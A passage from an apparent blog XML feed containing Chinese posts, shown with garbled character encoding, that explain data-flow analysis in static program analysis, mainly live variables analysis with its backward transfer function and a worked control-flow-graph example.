Analysis</code>ï¼ŒåŒ…æ‹¬å…¶<strong>å®šä¹‰ä¸ç†è§£ï¼Œåˆ†æè¿‡ç¨‹ï¼ˆç®—æ³•ï¼‰ï¼Œå®é™…ä¾‹å­</strong>ï¼Œè¯¥åˆ†æä½¿å¾—åœ¨ç¼–è¯‘ä¼˜åŒ–çš„è¿‡ç¨‹ä¸­å¯ä»¥é¿å…å¯¹å¤§é‡è¡¨è¾¾å¼è¿›è¡Œé‡å¤è®¡ç®—ï¼Œå¤§å¤§æå‡ç¨‹åºæ•ˆç‡ï¼Œæ–‡æœ«è¿˜å¯¹ç°æœ‰çš„ä¸‰ç§åˆ†ææ–¹å¼è¿›è¡Œäº†å¯¹æ¯”ã€‚</p><p>è‡³æ­¤ï¼Œæ•°æ®æµåˆ†æçš„ä¸‰ç§åˆ†æå·²ç»å…¨éƒ¨ç»“æŸï¼Œå½“ç„¶è¿™äº›å°šå¤„äºç†è®ºå±‚æ¬¡çš„ç†è§£ï¼Œè¿˜éœ€è¦é€šè¿‡å®é™…çš„åŠ¨æ‰‹åˆ†æé”»ç‚¼åæ‰èƒ½å°†è¿™äº›å†…å®¹èä¼šè´¯é€šï¼Œåç»­ä¼šæ·»åŠ æˆ‘çš„æ‰‹åŠ¨å®è·µç¬”è®°åˆ°åšå®¢ä¸­ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><sup><a href="#fn_1" id="reffn_1">1</a></sup> : <a href="https://www.bilibili.com/video/av97277892/?spm_id_from=333.788.b_765f64657363.3">å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹04ï¼ˆData Flow Analysis IIï¼‰_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>static_analysis</tag>
      
      <tag>available_expression_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€é™æ€åˆ†æã€‘æ•°æ®æµåˆ†æ-Part II</title>
    <link href="/article/1676.html"/>
    <url>/article/1676.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¸Šä¸€ç¯‡<a href="https://blog.gentlecp.com/article/19520.html">ã€é™æ€åˆ†æã€‘æ•°æ®æµåˆ†æ-Part I - æ±‚ç´¢</a>å¯¹æ•°æ®æµåˆ†æä¸­çš„<code>Reaching Definition Analysis</code>ä¸­è¿›è¡Œäº†è¯¦è§£ï¼Œç”¨äºå‘ç°<code>undefined variables</code>ï¼Œæœ¬æ–‡ç»§ç»­ç¬¬äºŒéƒ¨åˆ†å†…å®¹â€”â€”<code>Live Variables Analysis</code>ã€‚ä¸»è¦å†…å®¹åŒ…æ‹¬ï¼š</p><ul><li><code>Live Variables Analysis</code>çš„å®šä¹‰å’Œç†è§£</li><li><code>Live Variables Analysis</code>ç®—æ³•è®¾è®¡ä¸è¯¦è§£</li><li>ä¸¾ä¸ªæ —å­</li><li>æ€»ç»“</li></ul><p>è¯»å®Œæœ¬æ–‡ä¼šå¯¹æ•°æ®æµåˆ†æ<code>Live Variables Analysis</code>å†…å®¹æœ‰ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œè§£ç­”åŒ…æ‹¬<strong>æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆåšï¼Œæ•ˆæœæ€ä¹ˆæ ·</strong>ä¸‰æ–¹é¢çš„é—®é¢˜ã€‚</p><blockquote><p>æœ¬æ–‡ä¸­æ¶‰åŠçš„ä¸€äº›ä¸“ä¸šæœ¯è¯­æˆ–å®šä¹‰å¯åœ¨ä¸Šä¸€ç¯‡<code>Part I</code>ä¸­æ‰¾åˆ°ï¼Œå¼ºçƒˆå»ºè®®å…ˆé˜…è¯»ä¸Šä¸€ç¯‡æ–‡ç« ï¼Œæœ¬æ–‡ä¸å†é‡å¤èµ˜è¿°</p></blockquote><h2 id="Live-Variables-Analysis"><a href="#Live-Variables-Analysis" class="headerlink" title="Live Variables Analysis"></a>Live Variables Analysis</h2><p>ä»åå­—ç¿»è¯‘è¿‡æ¥æ˜¯å¯¹å­˜å‚¨å˜é‡çš„åˆ†æï¼Œè‡ªç„¶è€Œç„¶è¦å¼•å‡ºå®šä¹‰<strong>ä»€ä¹ˆæ˜¯<code>Live</code>ï¼Œä»€ä¹ˆæ˜¯<code>Dead</code></strong>ã€‚</p><div class="note note-info">            <p>å¯¹äºæ˜ç¡®ç»™å®šçš„çš„ä¸€ä¸ª<code>program point</code> pï¼Œå¦‚æœå­˜åœ¨ä¸€æ¡æ‰§è¡Œè·¯å¾„ï¼Œåœ¨è¯¥è·¯å¾„ä¸Š<code>Variable v</code>è¢«ä½¿ç”¨è¿‡ï¼ˆå¦‚<code>a = v</code>ï¼‰ï¼Œåˆ™è®¤ä¸º<code>v</code>æ˜¯<code>live</code>ï¼Œå¦åˆ™å°±æ˜¯<code>dead</code></p>          </div><p>æ¢æˆäººè¯å°±æ˜¯å¦‚æœæ²¡è¢«ä½¿ç”¨è¿‡çš„å˜é‡å°±æ˜¯<code>dead</code>(æ²¡ç”¨çš„å˜é‡)ï¼Œå°±å¥½æ¯”åˆå§‹åŒ–äº†ä¸€ä¸ªå˜é‡<code>v</code>ï¼Œç„¶è€Œåé¢çš„ç¨‹åºå°±æ²¡<code>v</code>ä»€ä¹ˆäº‹äº†ï¼Œé‚£è¿™ä¸ª<code>v</code>ç­‰äº<code>dead</code></p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327143037.png" alt="image-20210327143037134"></p><blockquote><p>æ³¨æ„åœ¨è¯¥è·¯å¾„ä¸Š<code>v</code>ä¸åº”è¯¥è¢«é‡æ–°å®šä¹‰</p></blockquote><p>é‚£<code>Live Variables Analysis</code>æœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ</p><p>ä¸€ä¸ªå¸¸è§çš„åœºæ™¯æ˜¯å½“ç¨‹åºéœ€è¦å¯¹æŸäº›å˜é‡è¿›è¡Œè®¡ç®—ï¼ŒåŒæ—¶å¯„å­˜å™¨å·²ç»æ»¡äº†çš„æ—¶å€™ï¼Œå°±å¯ä»¥å°†<code>dead</code>çš„å˜é‡ä»å¯„å­˜å™¨ä¸­æ›¿æ¢æ‰ã€‚</p><p><code>Live Variables Analysis</code>ä¸<code>Reaching Definition Analysis</code>çš„åˆ†æä¸åŒçš„ä¸€ç‚¹æ˜¯é‡‡ç”¨äº†<code>backward</code>çš„åˆ†ææ–¹å¼ï¼Œä¹Ÿå°±æ˜¯è‡ªåº•å‘ä¸Šï¼ˆå€’ç€åˆ†æï¼‰ï¼Œè¿™ä¸€ç‚¹éœ€è¦è§£é‡Šä¸€ä¸‹ï¼š</p><ul><li><p><strong>ä¸ºä»€ä¹ˆé‡‡ç”¨<code>backward</code>çš„åˆ†ææ–¹å¼</strong>ï¼šå‡è®¾<code>forward</code>åˆ†æï¼Œå¯¹äº<code>pogram point p</code>è¦ç¡®è®¤væ˜¯å¦<code>live</code>çš„å‰ææ˜¯æ‰¾åˆ°ä¸€ä¸ªvè¢«ä½¿ç”¨çš„è¯­å¥ï¼Œå¹¶ä¸”ä¸€ç›´è¦ç®—åˆ°<code>exit</code>,è¿™ä¹Ÿå°±æ„å‘³ç€ï¼Œåœ¨æ‰§è¡Œåˆ°<code>exit</code>ä¹‹å‰ï¼Œéƒ½è¦ä¿ç•™<code>p</code>è¿™ä¸ªä½ç½®å…³äº<code>v</code>çš„ä¿¡æ¯ï¼Œè¿™æ„å‘³ç€å¯¹ä¸€ä¸ªå˜é‡véœ€è¦ä¸€ä¸ªä¸€ç»´æ•°ç»„ä¿ç•™å…¶åˆ°<code>exit</code>å‰æ‰€æœ‰çš„çŠ¶æ€ï¼Œå¯¹äºå¤šä¸ªvï¼Œé‚£å°±éœ€è¦<strong>äºŒç»´æ•°ç»„</strong>æ¥å­˜å‚¨ã€‚</p><p>ä½†å¦‚æœæ˜¯<code>backward</code>ï¼Œåªè¦å‘ç°vè¢«ä½¿ç”¨çš„æƒ…å†µï¼Œåªéœ€è¦æ‰¾å‰é¢æœ€è¿‘çš„ä¸€æ¡å¯¹äºvçš„<code>definition</code>åŒ¹é…ä¸Šå³å¯ï¼Œå› æ­¤è¿™ä¸ªè¿‡ç¨‹ä¸­å¯ä»¥ç”¨<strong>ä¸€ç»´çš„æ•°ç»„</strong>å­˜å‚¨æ‰€æœ‰çš„å˜é‡ï¼Œå½“åŒ¹é…åˆ°ç›¸åº”<code>definition</code>å°±è®¤å®šè¯¥å˜é‡å¯¹è¯¥<code>program point p</code>æ˜¯<code>live</code>çš„ã€‚</p></li></ul><p>åé¢ä¾ç„¶é’ˆå¯¹<code>Abstraction</code>,<code>Transfer Function</code>,<code>Control Flow</code>ä¸‰ä¸ªéƒ¨åˆ†ä¾æ¬¡å®ç°ã€‚</p><h3 id="Abstraction"><a href="#Abstraction" class="headerlink" title="Abstraction"></a>Abstraction</h3><p>é’ˆå¯¹<code>Live Variables Analysis</code>ï¼Œæˆ‘ä»¬çš„å…³æ³¨ç‚¹åœ¨äºå˜é‡<code>v</code>çš„å˜åŒ–ï¼Œå®ƒæœ‰ä¸¤ä¸ªçŠ¶æ€<code>live</code> or <code>dead</code>ï¼Œå› æ­¤æˆ‘ä»¬ä¾ç„¶å¯ä»¥ç”¨<code>bit vector</code>çš„æ–¹å¼å»å¯¹ç¨‹åºä¸­å‡ºç°çš„å¤šä¸ªå˜é‡è¿›è¡Œå®šä¹‰ï¼Œå‡è®¾ç¨‹åºæœ‰<code>V1,V2,...,Vn</code>ï¼Œç”¨1è¡¨ç¤º<code>live</code>ï¼Œ0è¡¨ç¤º<code>dead</code>ï¼Œå®¹æ˜“å¾—åˆ°ä¸€ç»„å‘é‡è¡¨ç¤º<code>00...00</code>(åˆå§‹åŒ–çš„æ—¶å€™æ‰€æœ‰véƒ½æ˜¯<code>dead</code>)</p><h3 id="Transfer-Function"><a href="#Transfer-Function" class="headerlink" title="Transfer Function"></a>Transfer Function</h3><p>å‰é¢æˆ‘ä»¬å·²ç»ç¡®å®šäº†<code>backward</code>ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨ç»è¿‡ä¸€ä¸ª<code>BB</code>çš„æ—¶å€™ï¼Œéœ€è¦ä»<code>OUT[B]</code>ç»“åˆ<code>BB</code>ä¸­å¯¹vçš„ä½¿ç”¨æƒ…å†µï¼Œè®¡ç®—å¾—åˆ°<code>IN[B]</code>ï¼Œå¦‚æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è€ƒè™‘å‡ ç§ä¸åŒ<code>BB</code>çš„æƒ…å†µï¼ˆä¸‹é¢çš„vå¹¶éä¸€ä¸ªå…·ä½“çš„å˜é‡ï¼Œè€Œæ˜¯æ‰€æœ‰åœ¨<code>BB</code>ä¸­å¯èƒ½è¢«ä½¿ç”¨çš„å˜é‡ï¼‰ï¼š</p><ol><li><code>BB</code>ä¸­æ²¡ç”¨å¯¹<code>v</code>çš„ä½¿ç”¨ï¼Œä¹Ÿæ²¡æœ‰å¯¹<code>v</code>é‡æ–°å®šä¹‰ï¼ˆå¦‚<code>k=n</code>ï¼‰ï¼šå¾ˆæ˜¾ç„¶<code>IN[B] = OUT[B]</code></li><li><code>BB</code>ä¸­å­˜åœ¨å¯¹<code>v</code>çš„ä½¿ç”¨ï¼Œä½†æ²¡æœ‰å¯¹<code>v</code>é‡æ–°å®šä¹‰ï¼ˆå¦‚<code>k=v</code>ï¼‰: æ˜¾ç„¶åœ¨<code>IN[B]</code>ä¸­è¦åŠ ä¸Šä½¿ç”¨çš„éƒ¨åˆ†ï¼Œç”¨$use_B$è¡¨ç¤ºï¼Œå³$IN[B] = OUT[B] \bigcup use_B$</li><li><code>BB</code>ä¸­ä¸å­˜åœ¨å¯¹<code>v</code>çš„ä½¿ç”¨ï¼Œä½†æœ‰å¯¹<code>v</code>çš„é‡æ–°å®šä¹‰ï¼ˆå¦‚<code>v=3</code>ï¼‰ï¼šè¿™æ„å‘³ç€è¦ä»<code>OUT[B]</code>ä¸­å»é™¤è¢«å®šä¹‰çš„éƒ¨åˆ†ï¼Œå³$IN[B]=OUT[B]-def_B$</li><li><code>BB</code>ä¸­åŒæ—¶å­˜åœ¨å¯¹<code>v</code>çš„å®šä¹‰å’Œä½¿ç”¨ï¼Œè¿™æ—¶å€™å°±è¦åˆ†å¼€è€ƒè™‘å®šä¹‰åœ¨å‰è¿˜æ˜¯åœ¨åï¼š<ul><li>å®šä¹‰åœ¨å‰ï¼ˆ<code>v=2 k=v</code>ï¼‰ï¼šå®é™…ä¸Šè¿™æ—¶å€™è¢«ä½¿ç”¨çš„<code>v</code>å·²ç»æ˜¯æ–°å®šä¹‰çš„<code>v</code>äº†ï¼Œå› æ­¤å’Œ3ä¸€æ ·å¤„ç†</li><li>å®šä¹‰åœ¨åï¼ˆ<code>k=v,v=2</code>ï¼‰ï¼šè¿™æ—¶å€™è¢«ä½¿ç”¨çš„<code>v</code>ä¾ç„¶æ˜¯åŸæ¥çš„<code>v</code>ï¼Œåªä¸è¿‡ç”¨å®Œä¹‹åè¢«é‡æ–°å®šä¹‰äº†ï¼ˆæ ¹æ®<code>Live Variables Analysis</code>çš„å®šä¹‰ï¼Œ<code>v should not be redefined before usage</code>ï¼‰ï¼Œè¿™æ„å‘³ç€è¿™ç§æƒ…å†µä¹Ÿæ˜¯<code>live</code>çš„ï¼ŒåŒ2å¤„ç†</li></ul></li></ol><p>ç»¼ä¸Šæ‰€è¿°ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°<code>Transfer Function</code>:</p><script type="math/tex; mode=display">IN[B] = use_B \bigcup (OUT[B] - def_B)</script><blockquote><p>å…¶ä¸­$use_B$æ˜¯æŒ‡é‚£äº›useåœ¨<code>redefine</code>ä¹‹å‰çš„çš„ä½¿ç”¨</p></blockquote><h3 id="Control-Flow"><a href="#Control-Flow" class="headerlink" title="Control Flow"></a>Control Flow</h3><p>ä¸‹é¢è€ƒè™‘å¦‚ä½•å¤„ç†æ•°æ®æµæ±‡èšçš„æƒ…å†µï¼Œæ ¹æ®å‰é¢çš„<code>Live Variables Analysis</code>å®šä¹‰ï¼Œåªè¦å­˜åœ¨ä¸€æ¡æ‰§è¡Œè·¯å¾„ï¼Œè¯¥å˜é‡è¢«ä½¿ç”¨è¿‡å³å¯ï¼Œå› æ­¤ä¸<code>Reaching Definition Analysis</code>ç›¸åŒï¼Œ<code>Live Variables Analysis</code>çš„<code>Control Flow</code>ä¹Ÿæ˜¯å–$\bigcup$ ï¼Œåªä¸è¿‡ç”±äºæ˜¯<code>backward</code>ï¼Œ<code>OUTp[B]</code>å˜æˆæ±‚æ‰€æœ‰åç»§èŠ‚ç‚¹<code>IN[S]</code>çš„å¹¶é›†ï¼š</p><script type="math/tex; mode=display">OUT[B] = \bigcup_{S\ a\ successor\ of\ B}IN[S]</script><p>ä¸Šé¢å¯¹<code>Transfer Function</code>å’Œ<code>Control Flow</code>çš„è§£é‡Šå¤šç”¨æ–‡å­—ï¼Œå› æ­¤é…ä¸Šä¸€å¼ è€å¸ˆæä¾›çš„ä¾‹å›¾æ¥åŠ æ·±ç†è§£ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327154929.png" alt="image-20210327154929253"></p><blockquote><p>å…¶ä¸­ï¼Œå‡è®¾<code>OUT[B] = &#123;v&#125;</code>ï¼ˆå³åœ¨<code>OUT[B]</code>ä¸­væ˜¯<code>live</code>çš„ï¼‰ï¼Œæ ¹æ®å›¾ä¸­ä¸åŒæ•°å­—æ ‡æ³¨çš„æƒ…å†µï¼Œè®¡ç®—<code>IN[B]</code>ä¸­<code>v</code>çš„<code>live</code>,<code>dead</code>æƒ…å†µ</p></blockquote><h2 id="Live-Variables-Analysis-ç®—æ³•è®¾è®¡"><a href="#Live-Variables-Analysis-ç®—æ³•è®¾è®¡" class="headerlink" title="Live Variables Analysis ç®—æ³•è®¾è®¡"></a>Live Variables Analysis ç®—æ³•è®¾è®¡</h2><p>æœ‰äº†ä¹‹å‰<code>Reaching Definition Analysis</code>çš„ç®—æ³•è®¾è®¡æ€è·¯ï¼Œå…¶å®æˆ‘ä»¬å¯¹<code>Live Variables Analysis</code>ç®—æ³•çš„è®¾è®¡åº”è¯¥å˜å¾—å¾ˆå®¹æ˜“ï¼Œä¸»è¦å…³æ³¨å˜åŒ–çš„ç‚¹ï¼š</p><ol><li>åˆ†ææ–¹å‘ç”±<code>forward</code>è½¬å‘<code>backward</code>ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åˆå§‹åŒ–çš„å¯¹è±¡è¦ä»<code>entry</code>è½¬å‘<code>exit</code>ï¼Œ<code>OUT</code>è½¬å‘<code>IN</code></li><li>å…³æ³¨çš„å˜åŒ–å¯¹è±¡è¦ä¿®æ”¹äº†ï¼Œä¹‹å‰æ˜¯å…³æ³¨<code>OUT</code>ï¼Œå› ä¸ºæœ€ç»ˆè®¡ç®—ç»“æœåœ¨<code>OUT[B]</code>ä¸­ä½“ç°ï¼Œä½†ç°åœ¨è¦çœ‹<code>IN[B]</code>äº†</li></ol><p>ç»¼ä¸Šï¼Œç»“åˆ<code>Transfer Function</code>å’Œ<code>Control Flow</code>ï¼Œå¯ä»¥å¾—åˆ°ç®—æ³•å¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327160043.png" alt="image-20210327160043126"></p><blockquote><p>è¿™é‡Œå¯¹ç®—æ³•ä¸è¿‡å¤šè§£é‡Šï¼Œè¯¦ç»†å¯ä»¥å‚è€ƒä¸Šä¸€ç¯‡å¯¹<code>Reaching Definition Analysis</code>çš„ç®—æ³•åˆ†æè¿‡ç¨‹</p></blockquote><h2 id="ä¸¾ä¸ªæ —å­"><a href="#ä¸¾ä¸ªæ —å­" class="headerlink" title="ä¸¾ä¸ªæ —å­"></a>ä¸¾ä¸ªæ —å­</h2><p>åŒæ ·åœ°ï¼Œç†è§£äº†æ¦‚å¿µä¹‹åï¼Œéœ€è¦ç»è¿‡ä¸€ä¸ªå®é™…çš„æ —å­æ¥åŠ æ·±æ˜ åƒï¼Œä¸ä¸Šæ–‡ä¸€æ ·ï¼Œè¿™é‡Œå—é™äºæ–‡ç« å†…å®¹ï¼Œåªç»™å‡º<strong>èµ·å§‹</strong>å’Œ<strong>ç»“æŸ</strong>çš„çŠ¶æ€ï¼š</p><ul><li><strong>èµ·å§‹</strong>ï¼šå‡è®¾æŸCFGå¦‚ä¸‹</li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327160354.png" alt="image-20210327160354443" style="zoom:50%;" /></p><blockquote><p>å·¦ä¸Šè§’æ˜¯ç¨‹åºä¸­å‡ºç°çš„å˜é‡ï¼Œ0è¡¨ç¤ºéƒ½è¿˜æœªè¢«ä½¿ç”¨</p></blockquote><ul><li><strong>ç»“æŸ</strong></li></ul><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327160455.png" alt="image-20210327160455308"></p><div class="table-container"><table><thead><tr><th></th><th>B5</th><th>B4</th><th>B3</th><th>B2</th><th>B1</th></tr></thead><tbody><tr><td><strong>def</strong></td><td>z</td><td>x, q</td><td>x</td><td>m, y</td><td>x, y</td></tr><tr><td><strong>use(before  def)</strong></td><td>p</td><td>y</td><td>x</td><td>k</td><td>p, q, z</td></tr></tbody></table></div><blockquote><p>æ•´ä¸ªçš„è®¡ç®—æ€è·¯å’Œä¸Šä¸€ç¯‡æ–‡ç« ç±»ä¼¼ï¼Œåªè¦æ²¿ç€ç®—æ³•è¿‡ç¨‹ä¸æ–­è¿­ä»£å°±å¯ä»¥å¾—åˆ°æœ€ç»ˆç»“æœã€‚å¯¹äº<code>def</code> å’Œ<code>use(before def)</code>çš„è®¡ç®—æˆ‘ç‰¹åœ°æŒ‰ç…§<code>B5-&gt;B1</code>çš„é¡ºåºï¼Œæ˜¯ä¸ºäº†çªå‡º<code>backward</code>çš„æ€æƒ³ã€‚æ ¹æ®ä¸Šé¢çš„è¡¨æ ¼ç»“åˆç®—æ³•ï¼Œå¾ˆå®¹æ˜“è®¡ç®—å¾—åˆ°æ¯ä¸ª<code>BB</code>çš„<code>IN[B],OUT[B]</code>ã€‚<strong>å¯¹äºæœ€ç»ˆç»“æœå–å¦‚ä¸‹æ —å­è§£é‡Šï¼Œ<code>100 1001</code>è¡¨ç¤º<code>x,p,k</code>åœ¨æ­¤<code>program point</code>æ˜¯<code>live</code>ï¼Œå…¶ä»–éƒ½æ˜¯<code>dead</code>ï¼Œä½ ä¸å¦¨æ‰‹åŠ¨æ ¹æ®å®šä¹‰éªŒè¯ä¸€ä¸‹è¿™ä¸ªç»“è®ºæ˜¯å¦æ­£ç¡®</strong></p></blockquote><p><img src="https://gitee.com/gentlecp/ImgUrl/raw/master/20210327162508.png" alt="image-20210327162508258" style="zoom:50%;" /></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬æ–‡ç€é‡è®²è§£äº†æ•°æ®æµåˆ†æä¸­çš„<code>Live Variables Analysis</code>ï¼ŒåŒ…æ‹¬å…¶<strong>å®šä¹‰ä¸ç†è§£ï¼Œåˆ†æè¿‡ç¨‹ï¼ˆç®—æ³•ï¼‰ï¼Œå®é™…ä¾‹å­</strong>ï¼Œå®é™…ä¸Šè¿™éƒ¨åˆ†å†…å®¹å’Œ<code>Reaching Definition Analysis</code>åŸºæœ¬ä¸Šæ˜¯å¼‚æ›²åŒå·¥ï¼Œåªä¸è¿‡å°†åˆ†æçš„å¯¹è±¡ä»å®šä¹‰è½¬æ¢åˆ°äº†å˜é‡ï¼Œå› æ­¤ï¼Œåœ¨æ–‡ä¸­å¾ˆå¤šå¯¹æ–¹ï¼Œæˆ‘ä¼šæ‹¿ä¸¤è€…è¿›è¡Œå¯¹æ¯”ï¼Œå¹¶è¿›è¡Œä¸€äº›è·³è·ƒï¼Œå¦‚æœæœ‰çœ‹ä¸æ‡‚çš„åœ°æ–¹ï¼Œå»ºè®®å»Bç«™ä»”ç»†çœ‹çœ‹è€å¸ˆçš„æˆè¯¾è§†é¢‘ï¼Œç›¸ä¿¡ä¼šæœ‰æ›´æ·±çš„ä½“ä¼šã€‚</p><p>è¿™å ‚è¯¾å¸¦ç»™æˆ‘æ¯”è¾ƒæ‰“çš„ä¸€ä¸ªæ€è€ƒå°±æ˜¯<code>backward</code>å’Œ<code>forward</code>çš„é€‰æ‹©ï¼Œè¿™ä¸€ç‚¹æœ‰ç‚¹åƒèƒŒåŒ…é—®é¢˜ä¸­çš„æ­£å‘å¾ªç¯ï¼ˆ01èƒŒåŒ…ï¼‰å’Œé€†å‘å¾ªç¯ï¼ˆå®Œå…¨èƒŒåŒ…ï¼‰ã€‚å½“æŸä¸€æ¡è·¯å‰è¿›è®¡ç®—å›°éš¾æ—¶ï¼Œä¸å¦¨é€†å‘æ€è€ƒï¼Œå€’ç€èµ°æˆ–è®¸ä¼šæœ‰æƒŠå¥‡çš„å‘ç°ï¼ˆå½“ç„¶æ€è€ƒä¸æ˜¯éšç¼˜ï¼Œæ˜¯åŸºäºå¯¹å®šä¹‰çš„æ·±åº¦ç†è§£å’Œå‰–æå¾—åˆ°çš„ï¼‰</p><p>è‡³æ­¤ï¼Œå·²å®Œæˆæ•°æ®æµåˆ†æä¸­ä¸¤éƒ¨åˆ†çš„åˆ†æå†…å®¹ï¼Œä¸‹ä¸€éƒ¨åˆ†æ˜¯<code>Available Expresiions Analysis</code>ï¼Œå½“å†™å®Œä¸‰éƒ¨åˆ†å†…å®¹åï¼Œä¼šå¯¹ä¸‰è€…è¿›è¡Œä¸€ä¸ªå¯¹æ¯”æ€»ç»“ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><sup><a href="#fn_1" id="reffn_1">1</a></sup> : <a href="https://www.bilibili.com/video/av97277892/?spm_id_from=333.788.b_765f64657363.3">å—äº¬å¤§å­¦ã€Šè½¯ä»¶åˆ†æã€‹è¯¾ç¨‹04ï¼ˆData Flow Analysis IIï¼‰_å“”å“©å“”å“© (ã‚œ-ã‚œ)ã¤ãƒ­ å¹²æ¯~-bilibili</a></p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>static_analysis</tag>
      
      <tag>live_variable_analysis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€é™æ€åˆ†æã€‘æ•°æ®æµåˆ†æ-Part I</title>
    <link href="/article/19520.html"/>
    <url>/article/19520.html</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™é˜µå­åœ¨å­¦ä¹ é™æ€åˆ†æï¼Œæ‰¾äº†è®¸å¤šå­¦ä¹ ææ–™ï¼Œä½†è®²çš„éƒ½æ™¦æ¶©éš¾æ‡‚ï¼Œæ— æ„é—´åœ¨ç¥å¥‡çš„<code>bilibili</code> åˆ·åˆ°äº†ä¸€ä½å—äº¬å¤§å­¦<code>Yue Li</code>è€å¸ˆçš„é™æ€åˆ†æè¯¾ç¨‹<sup><a href="#fn_1" id="reffn_1">1</a></sup>ï¼Œä¸å¾—ä¸è¯´ï¼Œè€å¸ˆè®²çš„å¤ªæ£’äº†ï¼Œè®©æˆ‘å¯¹é™æ€åˆ†æçš„çŸ¥è¯†æœ‰äº†åŸºæœ¬çš„äº†è§£ï¼Œç®—æ˜¯åšäº†ä¸€ä¸ªç®€å•çš„å…¥é—¨ã€‚</p><p>æœ¬æ–‡ï¼Œæ˜¯é™æ€åˆ†æä¸­æ•°æ®æµåˆ†æçš„<code>Part I</code> ï¼Œä¸»è¦è®²è§£<code>Reaching Definition Analysis</code> ï¼Œä¸»è¦å†…å®¹åŒ…æ‹¬ï¼š</p><ul><li><p>å‰ç½®çŸ¥è¯†</p></li><li><p><code>Reaching Definition Analysis</code>çš„å®šä¹‰å’Œç†è§£</p></li><li><code>Reaching Definition Analysis</code>ç®—æ³•ä¸è¯¦è§£</li><li>ä¸¾ä¸ªæ —å­</li><li>æ€»ç»“</li></ul><p>è¯»å®Œæœ¬æ–‡ä¼šå¯¹æ•°æ®æµåˆ†æ<code>Reaching Definition Analysis</code> å†…å®¹æœ‰ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œè§£ç­”åŒ…æ‹¬<strong>æ˜¯ä»€ä¹ˆï¼Œæ€ä¹ˆåšï¼Œæ•ˆæœä½“ç°</strong>ä¸‰æ–¹é¢çš„é—®é¢˜ï¼ŒåºŸè¯ä¸å¤šè¯´ï¼Œ<code>Let&#39;s start!</code></p><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><p>åœ¨è¿›è¡Œ<code>Reaching Definition Analysis</code> ä¹‹å‰ï¼Œå…ˆéœ€è¦å¯¹ä¸€äº›åŸºç¡€æœ¯è¯­å’Œå®šä¹‰æœ‰åŸºæœ¬çš„äº†è§£ï¼š</p><ul><li><code>CFG, Control Flow Graph</code> (æ§åˆ¶æµå›¾)ï¼šè¿™ä¸ªæ¦‚å¿µåœ¨é™æ€åˆ†æä¸­ç»å¸¸è¢«æåŠï¼Œä¹Ÿååˆ†åœ°é‡è¦ï¼Œå®ƒå®šä¹‰äº†ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹å’Œèµ°å‘ï¼Œå¦‚æœæŠŠæ•°æ®æµæ¯”ä½œæ°´æµï¼Œæ§åˆ¶æµå›¾å°±æ˜¯ä¸€ç³»åˆ—ç»„åˆçš„ç®¡é“ï¼Œå®ƒæ§åˆ¶äº†æ°´èƒ½å¤Ÿç»è¿‡çš„åœ°æ–¹ï¼Œè¿™ä¸ªå†…å®¹æˆ‘ä¼šå•ç‹¬åœ¨åé¢å•ç‹¬å†™ä¸€ç¯‡æ–‡ç« è®²è§£ï¼Œè¿™é‡Œå…ˆæŒ‰ä¸‹ä¸è¡¨ã€‚</li><li><code>BB, Basic Block</code>(åŸºæœ¬ç¨‹åºå—)ï¼šæ˜¯<code>CFG</code> çš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œå¯ä»¥çœ‹ä½œå„ä¸ªç»“ç‚¹ï¼Œç”±ä¸€æ¡æˆ–å¤šæ¡åŸºæœ¬æŒ‡ä»¤ç»„æˆï¼Œè¿™ä¸ªå†…å®¹åŒæ ·åœ¨<code>CFG</code>çš„æ–‡ç« ä¸­è®²è§£</li><li><code>Input and Output 